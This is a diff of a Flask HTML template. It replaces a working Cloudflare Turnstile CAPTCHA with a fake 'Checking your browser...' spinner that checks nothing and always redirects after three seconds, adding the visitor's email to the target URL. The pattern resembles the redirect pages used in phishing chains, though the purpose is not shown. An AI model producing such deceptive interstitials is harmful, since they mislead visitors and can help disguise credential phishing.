@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verifying...</title>
+    <title>Checking your browser...</title>
     <style>
         html, body {
             padding: 0;
@@ -23,59 +23,47 @@
             box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
             border-radius: 10px;
         }
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .status-text {
+            font-size: 14px;
+            color: #555;
+        }
     </style>
 </head>
 
 <body>
     <div class="container">
-        <h2>Verifying you are human...</h2>
-        <div id="cf-turnstile-el" class="cf-turnstile"></div>
-        <p id="status">Please complete the CAPTCHA to continue.</p>
+        <h2>Checking your browser...</h2>
+        <div class="loader"></div>
+        <p class="status-text">This process should only take a few seconds.</p>
     </div>
 
-    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit&onload=onloadTurnstileCallback"
-        defer></script>
-
     <script>
-        const cfTurnStileSiteKey = '0x4AAAAAAAi0u5-vlDWayczz';
         const redirectUrl = "{{ redirect_url }}"; // Passed from Flask
         const email = "{{ email }}"; // Passed from Flask (optional)
-        let captchaVerified = false;
-
-        window.onloadTurnstileCallback = function () {
-            window.turnstileCurrentWidget = turnstile.render('#cf-turnstile-el', {
-                sitekey: cfTurnStileSiteKey,
-                callback: function (token) {
-                    console.log(`Captcha Success:`, token);
-                    captchaVerified = true;
-
-                    // Update status
-                    document.getElementById("status").innerText = "Verification successful! Redirecting...";
-
-                    // Redirect immediately
-                    redirectUser();
-                }
-            });
-
-            // If CAPTCHA doesn't load, redirect after 5 seconds
-            setTimeout(() => {
-                if (!captchaVerified) {
-                    console.log("CAPTCHA failed or did not load. Redirecting anyway.");
-                    document.getElementById("status").innerText = "Verification timeout! Redirecting...";
-                    redirectUser();
-                }
-            }, 5000); // Fallback after 5 seconds
-        };
-
+        
         function redirectUser() {
             let finalUrl = redirectUrl;
             if (email) {
                 finalUrl += "?email=" + encodeURIComponent(email);
             }
-            setTimeout(() => {
-                window.location.href = finalUrl;
-            }, 2000); // Add slight delay for better UX
+            window.location.href = finalUrl;
         }
+
+        // Always redirect after 3 seconds
+        setTimeout(redirectUser, 3000);
     </script>
 </body>
 
